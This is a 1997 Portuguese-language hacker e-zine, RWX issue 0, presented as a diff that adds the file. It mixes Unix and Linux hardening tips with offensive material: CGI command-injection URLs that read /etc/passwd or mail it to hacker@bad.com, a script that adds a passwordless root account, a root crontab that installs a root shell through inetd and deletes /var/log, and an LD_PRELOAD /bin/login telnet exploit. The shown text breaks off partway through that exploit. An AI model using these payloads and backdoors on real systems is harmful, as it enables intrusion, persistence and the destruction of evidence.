@@ -1,0 +1,1430 @@
+-start-
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::::::::""`````""::::::""`:.:`""::"`````"::'"```'.:::::
+::::: .g#S$$$$$S#n  .g#S$$     $$S#n. $$$S#s s#S$$$ :::::
+::::: $$$$$$ $$$$$  $$$$$$ $$$ $$$$$$ .  $$$ $$$   .:::::
+::::: $$$$$$g$$$$$. $$$$$$ $$$ $$$$$$ :'  $$g$$   .::::::
+::::: $$$$$$ $$$$$$ $$$$$$ $$$ $$$$$$ ' $$$$ $$$$  ':::::
+::::: $$$$$$  $$$$$ $$$$$$.$$$.$$$$$$ $$$$$ . $$$$$ :::::
+::::: $S$$$$   $$$$ `S$$$$$$$$$$$$$S'.`S$$  :  $$S'.:::::
+:::::.......:.....:::.............:::....:::....:::::::
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+RWX n. 00
+(melhor visto com vi, ou edit)
+
+e-mail do zine: rwx@valise.com
+                rwx@st.com.br
+
+home-page: http://152.160.30.1/~rwx  [temporario]
+           http://www.st.com.br/~rwx
+
+ESCLARECIMENTO
+==============
+
+Esta e' uma zine voltada a area de seguranca , seja qual for sua intencao
+em ler nao nos responsabilizamos pelo mau uso das informacoes aqui conti-
+das. Nao estamos aqui pra ensinar ninguem a ser Hacker ou  um terrorista,
+nosso  objetivo e a pura troca  de informacao  entre pessoas que buscam o
+conhecimento na rede, e nos opomos aqueles que so visam o lucro.Caso dis-
+corde de algo ou tenha alguma sujestao, escreva-nos, ficaremos felizes em
+ouvi-lo.
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+INDICE
+======
+
+faqs, textos
+ 1. INTRODUCAO
+ 2. INTRODUCAO A SEGURANCA NO CGI
+ 3. COMANDOS INICIAIS NO UNIX
+ 4. PROTEGENDO SEU XWIN
+ 5. UNIX BACKDOORS
+ 6. SETANDO SEU LINUX PARA A NET
+ 7. /bin/login
+
+exploits, bugs
+ 8. PINEBUG  - Qualquer sistema Unix-Compativel
+ 9. CRONTAB  - OSf/1 , AIX 3.* , Digital unix
+10. SENDMAIL - Qualquer sendmail 8.8.4
+11. CXTERM   - Linux
+
+finalizacoes, pedidos, agradecimentos, emails
+12. PEDIDO PARA A GALERA
+13. EMAILS
+14. END
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+INTRODUCAO
+==========
+auth 97
+
+No comeco de 1990, a internet mudou totalmente , desde os anos 80. Hoje a
+Internet  e' e pode ser usado por  qualquer um . Oque era apenas uma rede
+fechada, ganha novas atracoes e novas tecnologias a cada mes. No  Brasil,
+a  internet veio pela rnp . As oportunidades de comercio  e diversao  sao
+muitas, com isso, a popularidade aumentou muito.Com isso tb, veio o bando
+de provedores,um fazendo concorrencia com o outro, so' pra lucrarem mais,
+mas, onde esta o usuario simples nisso, aquele que trabalha o dia inteiro
+e depois chega a noite  e quer se divertir , mas com um provedor 64k, que
+junto com o bloqueto bancario, vem uma faca. Como ? ai, isso tudo provoca
+a desuniao, ou seja,tem muitos que so' vivem pra detonar web, mas pq tudo
+isso ? garanto que se cobrassem um preco justo,alem de vir mais clientes,
+garanto que iriam parar de tentar pegar mais senhas (os 'invasores').
+Mas enquanto isso nao acontece,nossa sociedade ta cada vez mais perverssa
+e precisamos uma uniao de provedores,ate certa parte,nos vamos ajudar vcs,
+nao importa o sistema, de linux a nt, sempre vamos dar umas dicas.
+Tentaremos  explicar muita coisa  que para nosso ponto  de vista e' muito
+'babaca' , mas para vcs , pode ser uma  coisa totalmente nova . Entao, se
+algum  admin  ou  qquer  cara , gostar do  nosso  trabalho , publicaremos
+mensalmente essa revista, mas, para isso, precisamos de apoio, precisamos
+de um espaco na web, tamo cansado de geocities, e tb nao tamo afim de  ir
+pra cadeia por ter dado cartao verdadeiro na internic.Se vc gostou, mande
+um reply , nos ficariamos lisongeados , se pelo menos um admin cedesse um
+pequeno espaco para pormos nossa revista. E vc usuario , se vc e' aqueles
+'gurus' do cyberspaco e nao gostar da revista, problema e' teu.Escrevemos
+nao so' para vc , se vc ja aprendeu, parabens! Quem escreve esse zine sao
+cinco neguinhos, tipo , auth, DmS , skynet , zaph0d e o N3trunn3r , esses
+caras vao tentar matar qquer falhazinha em muitos sistemas.
+Nessa edicao do zine, vamos mostrar algumas falhas no CGi,e muitas outras
+falhas como o do /bin/login,  que vai comprometer teu sistema MESMO . Tem
+muita  coisa boa, do tipo, como a galera  faz spoof , exploits para pegar
+root, comandos para novatos no unix . Cada texto desse e' uma  parte  bem
+sofrida nossa. Por isso, espero que aproveitem, como disse antes,e repito
+isso aqui nao e' para aquele cara esperto que detona tudo, ou para aquele
+sysadm que sabe tudo e se acha o bom,para esses,parem de ler o zine agora.
+
+com atencao,
+auth
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+INTRODUCAO A SEGURANCA DE CGI
+=============================
+auth 97
+
+Ta', aqui vai uma pequena introducao sobre muitos dos problemas encontra-
+dos em CGI 's , e' importantissimo que  admins e interessados  no assunto
+leiam esta materia, pois acho que essa e' a primeira detalhando os passos
+seguidos por um invasor em portugues, atraves do CGI. O uso destes , tras
+muitas vantages para a visao do usuario, mas por tras de muitos codigos ,
+existe muita inseguranca, espero abrir um pouco a mente da galera , para
+comecar a escrever scripts seguros, sem mais besteiras, vamos ao assunto.
+
+.........................................................................
+
+O CGI, Common Gateway Interface, e' uma interface que deixa a comunicacao
+entre  programas do cliente e a do servidor livres para se falarem , e tb
+de entender  certos tipos de hyper-text . O tcp e' o protocolo usado pelo
+script CGI, durante suas comunicacoes, a porta original e' a 80.
+
+Se  um programa em cgi e' escrito corretamente, e' muito dificil qualquer
+usuario danificar e apagar dados do sistema.Mas,para um usuario indeviduo
+acessar algo, e' necessario que o dir cgi-bin nao esteja marcado com 0,ou
+seja, esteja livre para qquer user.
+
+Um exemplo basico de como um usuario pode mexer,e' criando um arquivo pe-
+rigoso. Por exemplo , o server esta rodando como nobody o que normalmente
+tem permissao para escrever no diretorio /tmp.Criando um arquivo qualquer
+chamado por exemplo BLA dentro do tmp com o touch:
+
+http://server/cgi-bin/finger?nome; \
+touch%20/tmp/bla
+
+http://server/cgi-bin/finger?nome; \
+touch+/tmp/bla
+
+Isso nao e' motivo para se alarmar ou chorar por besteiras, pois o maximo
+que o usuario pode fazer, e' pegar seu passwd. :))
+Existe tecnicas e furos como os de PHF, ou o PHP (elimine, rm), ou  ate o
+QUERY, que sao arquivos  encontrados no meio CGI , que podem simplesmente
+ao alguem acessar, alcancar seus arquivos de superusuario . Isso e',claro
+qdo o cgi-bin nao esta protegido.
+
+Phf:
+----
+
+http://www.<provedor>.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+Php:
+----
+
+http://www.<provedor>.com/cgi-bin/php.cgi?<arquivo_a_ler>
+
+Query:
+------
+
+http://www.<provedor>.com/cgi-bin/query?%0a/bin/cat%20/etc/passwd
+
+Atencao, o phf, o php, e o query nao sao bugs! Os tres,fazem suas funcoes
+normalmente, nao citadas ae por motivo de espaco.
+
+.........................................................................
+
+Test-CGI
+--------
+
+Esse e' mais um  verdadeiro furo, que eh encontrado em muitos arquivos de
+test cgi,ele normalmente fica no dir cgi-bin,qdo vc fizer ele diretamente
+na porta 80, ele vai cair diretamente no dir do root , mostrando os dirs.
+
+http://www.<provedor>.com/cgi-bin/test-cgi?/*
+
+vai aparecer muita coisa, como configuracao e bla,bla.
+
+Como arrumar ? simples , como antes , apague o test-cgi, pra que usa-lo ?
+
+.........................................................................
+
+Exemplos mais maleficos de scripts:
+
+Ai vao, alguns textos de scripts, todos com certos problemas neles.
+
+#!/usr/bin/perl
+print "Content-type: text/plain\n\n";
+$address = $ENV{`QUERY_STRING`};
+print "FINGER de $address:\n\n", \
+`/usr/bin/finger $address`;
+
+Neste  primeiro exemplo, temos uma chamada ao finger , o objetivo era ver
+dados de usuarios,mas com isto da pra notar que vc pode ver qualquer file
+do sistema, com o "fingerd" :
+
+http://www.<servidor>.com/cgi-bin/finger?nome; \
+%20mail%20hacker@bad.com%20< /etc/passwd
+
+Como, esta direcao , ira dar o finger no NOME , e ira mandar um mail para
+hacker@bad.com, com o /etc/passwd. Simples e obvio, nao ?
+So que isso,e' muito dificil de se encontrar hoje,muitos admins ja cortam
+o finger na porta 79 no  /etc/services, ou seja, nao deixam mais  ninguem
+acessar essa porta , quanto  mais fazer um script retardado  para  fingar
+alguem.Ai em baixo vai uma versao mais sutil e segura do script para fing,
+so' abilitando caracteres de a-z, A-Z, 0-9, . - _ @. Se fizermos isso , o
+script reconhecera os comandos indeviduos, e assim ficara seguro.
+
+#!/usr/bin/perl
+print "Content-type: text/plain\n\n";
+$address = $ENV{`QUERY_STRING`};
+if ($address =~ /[^a-zA-Z0-9_-.<\@>]/) {
+   print "Username tem que ser assim
+   \"user@machine\", tente novamente,\n";
+}
+else {
+  print "FINGER de $address:\n\n", \
+  `/usr/bin/finger $address`;
+}
+
+.........................................................................
+
+Esse exemplo, ja  e' mais normal, e acontece em muitos, mas muitos servi-
+dores brasileiros , e' o caso de mandar  emails diretamente da url para o
+user.
+
+#!/usr/bin/perl
+require ("cgi-lib.pl"); ReadParse;
+
+#Coloque "To:" para quem
+#"$in{`to`}"
+
+open (MAIL,"| /usr/lib/sendmail $in{`to`}");
+print MAIL "From: ble\n\nbla\n";
+close MAIL;
+
+Os usuarios mais espertos tentariam colocar no "to:" a seguinte linha:
+
+nobody@seila.com; mail hacker@bad.com < /etc/passwd;
+
+Isso, mandara direto para o hacker@bad.com, o arquivo passwd. Cuide-se !
+Uma melhor forma de escrever este script CGI, e' a seguinte:
+
+#!/usr/bin/perl
+require ("cgi-lib.pl"); ReadParse;
+open (MAIL,"| /usr/lib/sendmail -t -oi");
+print "To: $in{`in`}\nFrom:
+MyForm\n\nBla\n";
+close MAIL;
+
+Assim ele fica bem melhor!
+
+.........................................................................
+
+Olha, esse exemplo e' um script bem daqueles pega admin,do tipo,colocando
+esse  script no seu cgi-bin , qualquer usuario tera  limites a acessar  e
+executar qualquer arquivo no seu hd,o prog,so' re-mostra qualquer palavra
+que vc escreva, mas, mostra tb o perigo do %0A.
+
+  #!/usr/local/bin/perl
+  # usage: http://<server>/cgi-bin/echo?
+
+  $| = 1;
+  $in = $ENV{'QUERY_STRING'};
+  $in =~ s/%(..)/pack("c",hex($1))/ge;
+
+  # Caracteres basicos
+  $in =~ s/([;<>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g;
+
+  print "Content-type: text/html\n\n";
+  system("/bin/echo $in");
+
+agora, executando isso no seu browser, ou mesmo telnetiando pra 80:
+
+http://<server>/cgi-bin/echo?ola%20admin
+
+isso ira mostrar na tela "ola admin"... :))
+mas se vc acrescentar 3 caracteres, do tipo %0A,vc podera executar certas
+coisas impossiveis. Ex:
+
+http://<server>/cgi-bin/echo?%0Acat%20/etc/passwd
+
+Executando a funcao "cat" para pegar o /etc/passwd.
+
+.........................................................................
+
+Do tipo, se vc usa o script de WWWboard de Matt's Script Archive,
+(www.worldwidemart.com/scripts), seu sistema e' vulneravel, o usuario
+pode mudar as mensagens escritas. Mas, como o arquivo de passwd, tem que
+ficar no mesmo diretorio do wwwboard, fica simples catar o passwd, que
+normalmente, hehe, e' desprotegido. Dica simples, mude o arquivo para um
+outro nome, e edite o script para achar o novo arquivo.
+
+.........................................................................
+
+Ae , e' isso ai, leiam! Este texto nao foi la nada 'hacker', e  complexo,
+se vc ja sabia ou tal, o problema e' teu, tem muito admin que deixa muito
+muito  cgi aberto  pra galera ir  la e detonar , a esses que o texto  lhe
+sirvam. Nao se esqueca, este foi a primeira parte,trazendo as partes mais
+basicas da seguranca em scripts feitos em perl e outros, proxima edicao ,
+tem mais! :))
+
+auth.
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+Unix Commands by DmS
+====================
+
+Bom aqui vao explicacoes dos comandos mais usados em UNIX:
+
+* ls : Listagem dos arquivos
+Opcoes recomendadas: ls -la
+
+ps : Comando que permite ver "todos" os procedimentos
+     que estao sendo rodados naquele momento.Bastante
+     util para verificar o PID do procedimento em caso
+     de vc querer killar o procedimento.
+Opcoes recomendadas: ps -aux
+
+kill : Comando usado pra killar procedimentos.
+Opcoes recomendadas: kill -9 <PID>
+->OBS<-: PID sera o numero do processo a ser killado
+
+cat : Serve para mostrar o conteudo do arquivo.
+       Recomendo usar junto com o comando more
+Exemplo:cat /home/rwx/text.doc |more
+
+who : Como o comando ja diz, serve para ver quem
+      esta logado na maquina no momento.Ele indica
+      IP , tty , e outras coisas do usuario
+Opcoes recomendadas: who -HTu
+
+chmod:Mudar permissoes dos arquivos. R(read) W(Write)
+      X(eXecute).
+      Cada grupo de usuarios da maquina tem uma permissao.
+      -   rwx   r-x   r-x
+      tipo owner grupo outros
+
+      Na parte tipo , ele determina que tipo de arquivo que é.
+      Por exemplo se for um tipo d = diretorio , - = arquivo
+      l = link e assim por diante.
+
+      Na sessao owner , estao as permissoes do dono do arquivo
+      No nosso exemplo , o dono pode r(ler) w(escrever) e x(executar).
+
+      Em grupo ,todos os usuarios pertecentes a esse grupo tem permissoes
+      r-x , ou seja, tem permissao para "ler" e executar.
+
+      Os outros usuarios que nao sejam nem o owner, nem seja do mesmo
+      grupo, teram permissoes para ler e executar o arquivo.
+
+        Alterando permissoes
+      ====================
+
+chmod atribuicao arquivo
+
+        onde atribuicao serao os caracteres da permissao. Por exemplo:
+        Exemplo: chmod ugo=rw rwx00.txt
+        u=dono do arquivo, g=grupo e o=outros usuarios.
+        r=leitura e w=escrever . No exemplo acima, todos os usuarios
+        teram permissao para ler e escrever no arquivo rwx00.txt
+
+        Outro exemplo: chmod go-x exec.sh
+        O grupo e os outros usuarios sem serem o dono, perderam
+          a capacidade de executar(x) o arquivo exec.sh
+
+        Alterando por numeros:
+        ======================
+        O chmod pode tambem ser usado com numeros que facilitam
+          a mudanca de permissoes dos arquivos
+
+        --------------------------
+        numero    permissoes
+        --------------------------
+        0           ---
+        1           --x
+        2           -w-
+        3           -wx
+        4           r--
+        5           r-x
+        6           rw-
+        7           rwx
+        --------------------------
+
+Exemplo: chmod 644 teste.txt
+
+        As permissoes do arquivo teste.txt passaram a ser
+      w-r--r-- , onde o dono podera ler e escrever ,
+      o grupo podera apenas ler igualmente aos outros.
+
+        Outro exemplo: chmod 777 rwx.sh
+
+        Todos os usuarios da maquina teram permissao para
+        ler, escrever e executar o arquivo rwx.sh
+
+setuid:
+
+Este bit, se ativado no grupo de permissoes do dono do arquivo,indica que
+todos os q executarem este programa o estarao  fazendo com os privilegios
+do proprietario do arquivo.Por exemplo, o programa sendmail e setuid root,
+o que lhe permite gravar arquivos na fila de mensagens do sistema,o que e
+vedado a usuarios normais.Este bit não possui significado em arquivos nao
+executaveis.
+
+ex:
+-r-sr-sr-x   1 root     bin        237332 May 11  1996 /usr/sbin/sendmail
+
+setgid
+
+Este bit atua da mesma forma que o setuid bit, com a diferenca que o pro-
+grama sera executado com as permissoes do grupo ao qual pertence.
+
+NOTA: Shell scripts que possuem os bits setuid ou setgid ligados  nao sao
+      seguros , nao importa quantas  precaucoes  tenham sido  tomadas  ao
+      escreve-los . Tais  scripts nunca devem ser permitidos  em qualquer
+      sistema Unix.Algumas versoes antigas do Unix nao resetavam o setuid,
+      ou seja, um arquivo com a permicao write p/ all com setuid root po-
+      deria ser copiado a um shell por qualquer pessoa tornando-a root.
+      <vide texto acima escrito por auth "seguranca em cgi".>
+
+Proxima edicao tem mais comandos!! :))
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+PROTEGENDO SEU X Windows
+========================
+n3trunn3r 97
+
+Esse eh um esquema chamado "Magic-Cookie" , e tem como objetivo  proteger
+usuarios de Linux /X-Windows de  programas tipo "xkey" , que capturam  os
+caracteres digitados no XWin. Se voce estiver rodando o  xdm naum precisa
+fazer nada , mas  se  vc estiver rodando o XWin  "single user" vc precisa
+fazer o esquema, pois o xdm naum estara sendo usado.
+Eh bem facil de fazer, e naum deve dar nenhum problema  se vc fizer  tudo
+certo. Bom, vamos lah.
+
+Em primeiro lugar, rode o xauth como root. Com isso , sera criado o Magic
+Cookie.Ao rodar o xauth pela primeira vez,aparecerah na tela alguma coisa
+do tipo:
+
+xauth: creating new authority file /home/locutus/.Xauthority
+Using authority file /root/.Xauthority
+xauth>
+
+Agora vc tera que pensar em um numero hexadecimal de 100 digitos.
+Pode colocar qq um, vc naum vai ter que lembrar dele depois ;)
+(mas naum coloque numeros muito faceis de se adivinhar, como 1111111...)
+
+No prompt do xauth digite:
+
+xauth> add :O MIT-MAGIC-COOKIE-1 <numero.gigante>
+
+Digite "exit" e saia do xauth. Com isso, as informacoes serao gravadas
+no .Xauthority no dir /root .
+Copie esse arquivo para o /home so usuario que tem acesso ao X-Win,
+e para /etc/X11/Xauthority. Certifique-se de que /etc/X11/Xauthority
+esta com a permissao 600 e que seu proprietario seja root. Alem disso,
+faca com que a copia que esta no /home do usuario esteja com a
+permissao +r para este usuario.
+
+Quase pronto. Agora que vc criou o Magic-Cookie, deve editar o arquivo
+/usr/X11/bin/startx. Ache a linha serverargs="" e coloque no lugar:
+
+serverargs="-auth /etc/X11/Xauthority"
+
+Com isso o Xwin ira chamar o Magic-Cookie.Reinicie o XWin e esta pronto.
+
+That's ALL!
+
+Se me derem uma conta, hehe, mes que vem tem mais
+
+by N3tRUNN3r
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+UNIX BACKDOORS
+==============
+auth 97
+
+Bom, ai vai 2 tipos de backdoors para unix , se vc encontrar um desses ai
+na sua maquina, vc sabe oque deve fazer (apague, ou altere os filez)
+Backdoor , e' um tipo de 'seguranca'  para  aqueles que ja pegaram root e
+se em caso o root trocar a senha ou outra coisa acontecer, vcs terao como
+voltar a ser root. simples mas eficaz. :)
+
+Esse primeiro, nao e' bem um backdoor, esse eh soh um caso de desespero
+para o 'invasor', ele vai botar um superusuario no meio do passwd com o
+nome de Jtadeu, ta ai o script.
+
+#!/bin/csh
+
+set linecount = `wc -l /etc/passwd`
+cd
+cp /etc/passwd ./temppass
+echo passwd file has $linecount[1] lines.
+@ linecount[1] /= 2
+@ linecount[1] += 1
+echo Creating two files, $linecount[1] lines each \(ble\).
+split -$linecount[1] ./temppass
+echo "Jtadeu::0:0:Ja deu, Tadado:/home/sweet/home:/bin/csh" >> ./xaa
+cat ./xab >> ./xaa
+mv ./xaa /etc/passwd
+chmod 644 /etc/passwd
+rm ./xa* ./temppass
+echo Prontinho!
+
+..........................................................................
+
+Com esse backdoor , o 'invasor' vai  ter root apartir  das 2:00  da manha,
+eh so' modificar esse file: /usr/spool/cron/crontab/root
+E pronto, coloque isso:
+
+2 * * * *  cp /etc/passwd /tmp/.passwd
+2 1 * * *  echo Jtadeu::0:0:Ja dei:/:/bin/bash > /etc/passwd
+2 2 * * *  cp /etc/inetd.conf  /tmp/.inetd.conf
+2 3 * * *  echo Portashell        stream       tcp      nowait         root
+/bin/sh       sh -i > /etc/inetd.conf
+2 4 * * *  cp /etc/services /tmp/.services
+2 4 * * *  echo telnet  stream  tcp   nowait  root   /usr/sbin/in.telnetd   /us
+r/sbin/in.telned >> /etc/inetd.conf
+2 5 * * *  echo  rwx        1888/tcp    > /etc/services
+4 * * *  cp /tmp/.passwd /etc/passwd
+4 1 * *  cp /tmp/.inetd.conf /etc/inetd.conf
+4 2 * *  cp /tmp/.services /etc/services
+4 3 * *  rm /var/log/*
+4 5 * *  rm /tmp/*
+4 6 * *  /sbin/reboot
+
+Simples, e exato. :))
+
+Mes que vem tem mais,e' so' nois acha um server que de uma page livre... :)
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+DICAS - Prepare seu Linux pra Grande Rede.
+==========================================
+By Skynet 27/07/97
+
+INTRODUCAO
+==========
+Nesta secao de dicas mostrarei
+algumas maneiras de adaptar seu Linux a realidade da Internet. Obviamente
+esta  materia  esta mais  voltada aquele  usuario  que esta  comecando  a
+conhecer o potencial do melhor Sistema  Operacional do mundo, e  que  nas
+maos  de  pessoas inexperientes pode se tornar o seu maior vilao. Caso vc
+ja seja Guru nisso aqui, peco pra nao ler,pois nao gosto de piadinhas pro
+meu lado ;-P
+  ....
+Depois de instalado, o linux , varios de seus servicos vem habilitado por
+default . Isso torna sua maquina um tanto quanto "vulneravel" , seja  por
+problemas de projeto(Bugs),seja por excesso de informacao (netstat,finger
+,etc...) Muitas  dessas vulnerabilidades serao  discutidas brevemente nos
+proximos numeros.
+
+O que ta valendo aqui e o seguinte:
+Como proteger seu sistema dos seus inimigos.
+
+       .....................................
+
+1- SERVICOS DO TCP PORT
+=======================
+Sao esses 3:
+
+a)Netstat (tcp/15)
+  Mostra todas as informacoes sobre sua coneccao (portas,enderecos,etc)
+
+b)Systat  (tcp/11)
+  Se encarrega de mostrar os processo que tao rodando na sua
+  maquina,ou seja,qualquer pessoa pode saber o que vc ta fazendo,
+  simplesmente dando um telnet pra porta 11.
+
+c)Finger  (tcp/79)
+  Mostra informacoes sobre usuarios no seu sistema(logins,diretorios,
+  tempo, shells,etc..). Apresenta algumas falhas de seguranca que podem
+  ser exploradas remotamente.
+
+NOTA: Todos eles ja vem habilitados por default, ao meu ver foi uma
+====  mancada de quem projetou o sistema(minha opiniao).
+
+Aconselho desabilitar esses servicos. Comente as seguintes linhas no
+arquivo /etc/inetd.conf:
+
+#finger stream  tcp     nowait  nobody  /usr/sbin/tcpd  in.fingerd -w
+#systat stream  tcp     nowait  nobody  /usr/sbin/tcpd  /bin/ps -auwwx
+#netstat        stream  tcp     nowait  root    /usr/sbin/tcpd /bin/netstat -a
+
+        ..........................................
+
+2- ttysnoop - MONITORANDO OS TERMINAIS
+=====================================
+Certamente vc sabe o que e um TELNET SERVER(ohhh!) Pois bem,a maioria das
+pessoas que conheco desabilitam esse servico por precaucao.Na minha opiniao
+tal medida nao e necessaria,  pois existem ferramentas que alertam de uma
+eventual "invasao" . Uma delas e o ttysnoop.Pra quem nao sabe esse daemon
+faz  com que  vc veja tudo que esta acontecendo no terminal de  acesso da
+maquina (ttypn), alem de limitar o acesso a mesma.Infelizmente o ttysnoop
+so permite que vc OLHE o que outro ta fazendo,se vc tentar mexer  em algo
+a coneccao com o terminal sera perdida. A Instalacao e bem simples e vale
+a pena.
+
+2.1 Instalacao passo-a-passo
+----------------------------
+a) Desabilitar o in.telnetd. Pra isso comente a seguinte linha no
+/etc/inetd.conf:
+#telnet stream  tcp     nowait  root    /usr/sbin/tcpd  in.telnetd
+
+b) Habilitar o in.telnetttysnoopd. Tire o comentario da seguinte linha:
+telnet stream  tcp     nowait  root   /usr/sbin/tcpd /usr/sbin/in.telnetsnoopd
+
+OBS: Certifique-se de que esse arquivo realmente existe na maquina, ja vi
+     casos em que o sistema nao veio com ele(RedHat).
+
+c) Definir os terminais de acesso e monitoramento. Essa e a parte mais
+   importante. acrescente as seguintes linhas no  /etc/snooptab:
+
+   # tty           snoopdev        type    execpgm
+   ttyp0           /dev/tty6       login   /bin/login
+   ttyp2           /dev/tty5       login   /bin/login
+
+  No exemplo eu defini dois terminais de monitoramento. Quando alguem der
+  um TELNET o snoopdev sera direcionado para os consoles ALT-F6 ou ALT-F5.
+  Nesse caso o numero maximo de coneccoes permitidas na maquina sera de
+  2 e vc vera tudo que esta acontecendo! Interessante, huh?
+
+OBS: Nao esquecer de que pra tudo isso funcionar vc devera reinicializar
+     o sistema.
+        ................................................
+
+3- Monitorando o FTP server
+   ========================
+   O Ftp server e outro servico que muita gente(inclusive EU) tem o custume
+   desbilitar. Nao conheco nenhum programa que mostre o q o cara ta fazendo
+   no FTP server em tempo real como o ttysnoop, mas ha  um truque simples
+   que mostra quem ta logado no ftp e o que ta fazendo! :-)
+
+Ex:
+cyberdine:~# tail -f /var/adm/messages
+
+Aug  3 00:15:31 cyberdine wu.ftpd[125]: connect from skynet@127.0.0.1
+Aug  3 00:15:42 cyberdine ftpd[125]: USER skynet
+Aug  3 00:15:44 cyberdine ftpd[125]: PASS password
+Aug  3 00:15:44 cyberdine ftpd[125]: SYST             \
+Aug  3 00:16:22 cyberdine ftpd[125]: PORT               \ Aqui eu simples-
+Aug  3 00:16:51 cyberdine ftpd[125]: CWD /home/skynet   / mente digitei um
+Aug  3 00:18:54 cyberdine ftpd[125]: FTP session closed   "pwd" e um "bye"
+
+K00l! Isso nao so mostrara o que acontece no ftpserver em tempo real como
+tambem outras coisas, como Status da coneccao(ppp),telnet,etc...
+   ................................................................
+
+4- /var/adm/debug - PROTEGENDO SUAS SENHAS (PPPD)
+   ===============================================
+   Existe uma arquivo chamado debug que loga todas as informacoes
+   referentes a comunicacao de sua maquina com o provedor entre as quais
+   a senha que vc eventuamente esta usando para conectar, creio que os mais
+   desligados podem nao ter reparado esse detalhe:
+
+cyberdine:~$ grep 'password' /var/adm/debug
+
+Apr  2 13:04:17 cyberdine pppd[31984]: sent [PAP AuthReq id=0x1 user="skynet"
+password="SuaSenha"]
+
+Tal  arquivo  vem com permicao Read p/ ALL! Aconselho a tirar todos os
+modos non-root desse arquivo.
+
+Ex:
+
+cyberdine:~# chmod go-rwx /var/adm/debug
+
+OBS: Faca o mesmo com os arquivos /var/adm/messages e syslog.
+        .....................................................
+
+Bom, por enquanto e so. Nas proximas edicoes vou colocar dicas mais
+avancadas(Only Gurus) ;-)
+
+//////////////////////////////////////
+/    Cya, d00d.                      /
+/..:.Skynet Undergrounds 1997.:..    /
+//////////////////////////////////////
+
+/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/-#*/
+
+Relacao Cliente/Servidor de sistemas TELNET unix-compativeis
+O Furo - /bin/login
+Escrito por Zaph0d no dia 3/8/97, as 10hs, 30mins, 07segs, 134ms, ...
+=====================================================================
+
+Hi D00dZ,
+
+1) Consideracoes Iniciais:
+
+Bem, este eh o numero 0 da nova zine RWX, e estou realmente mto lisongeado
+em ter sido convidado a colaborar com ela, pelo meu amigo SkyNet, um dos
+organizadores da zine. Rasgacoes de seda a parte, estou aki pra falar de
+seguranca de sistemas cliente/servidor do velho conhecido de vcs: O
+TELNET.
+
+O Telnet tem um potencial mto grande de furos a ser explorado, pelo
+simples fato de que como todos vcs jah devem saber, TODO cliente telnet
+unix-compativel tem capacidade de exportar variaveis de sistema, e todo
+servidor telnet tbem unix-compativel, tem a capacidade de aceitar essas
+variaveis exportadas, e isso eh um grande furo em potencial...
+
+No nosso ex. de hoje, estaremos nos utilizando de uma falha no /bin/login
+de alguns sistemas UNIX, geralmente Linux Slackware, mas eventualmente
+pode cair num RedHat, ou quem sabe ateh no BSD.
+
+2) A diversao comeca aki
+
+Como dito acima, todo cliente telnet unix-compativel tem a capacidade de
+exportar variaveis de sistema (e vcs pode tbem defini-las, nham). Como
+entao definir e exportar variaveis de sistema?
+
+a) Definindo e exportando variaveis de sistema em clientes telnet.
+
+rwx:~$ telnet
+telnet> environ define TERM vt100
+telnet> env exp TERM
+telnet>
+
+O q eu fiz acima? No prompt do seu shell predileto, entre no 'telnet'
+apenas digitando esse comando, sem nenhum parametro. Uma vez no prompt
+'telnet>' define-se a variavel de sistema TERM como 'vt100' (o padrao
+dessa variavel eh 'Linux', no meu caso q uso o Slackware), digitando
+'environ define TERM vt100'. Os comandos do telnet podem ser abreviados,
+como env=environ, def=define, exp=export, li=list, e tantas outras
+combinacoes q vc pode criar. Apos ter criado a variavel TERM (re-criado,a
+bem da verdade), e definido ela como 'vt100', vem-se a hora de marca-la
+como exportavel (alguns telnet's jah na criacao da variavel a marcam como
+exportavel). Exportar a variavel foi exatamente o q fiz na 3a linha.Com o
+comando 'env exp TERM', q eh uma abreviacao de 'environ export TERM', eu
+marquei a variavel TERM como exportavel.
+
+Pronto, agora vc estah no jogo, e jah aprendeu a definir/exportar
+variaveis atraves de um cliente telnet unix-compativel. Soh pra finalizar
+este topico, a q vai uma dica pra qdo desejarem saber se a variavel
+recem-definida estah realmente marcada como exportavel:
+
+telnet> environ list
+
+A saida deste comando serah uma imensa lista de variaveis (q podem ser
+totalmente vistas com o SHIFT-PGUP, SHIFT-PGDOWN),e entra elas encontro a
+seguinte linha:
+
+* TERM                 vt100
+
+O * do lado da variavel TERM me indica que ela estah marcada como
+exportavel.
+
+Isso evidentemente devo fazer apos a definicao/exportacao das variaveis,
+apenas como uma forma de me certificiar q fiz as coisas corretamente.
+
+b) O furo - /bin/login
+
+Tendo entendido completamente a explicacao acima, vem-se a brincadeira,
+hehe >:). Em alguns Linux Slackware's (e outros, possivelmente), ha um
+falha ateh certo ponto grotesca no /bin/login. Isso mesmo, akele
+programinha onde vc digita seu login e password. Alguns /bin/login sao
+estaticos, nao aceitando variaveis de sistema como parte da sua rotina de
+funcionamento, e estao imunes a este furo, jah outros /bin/login sao
+dinamicos (we're in game there), e aceitam uma certa variavel de sistema
+que define uma biblioteca de auxilio a execucao da rotina de funcionamento.
+Que variavel eh esta? Bem, a variavel se chama LD_PRELOAD, e vc deve
+defini-la/exporta-la como o caminho completo ateh onde se
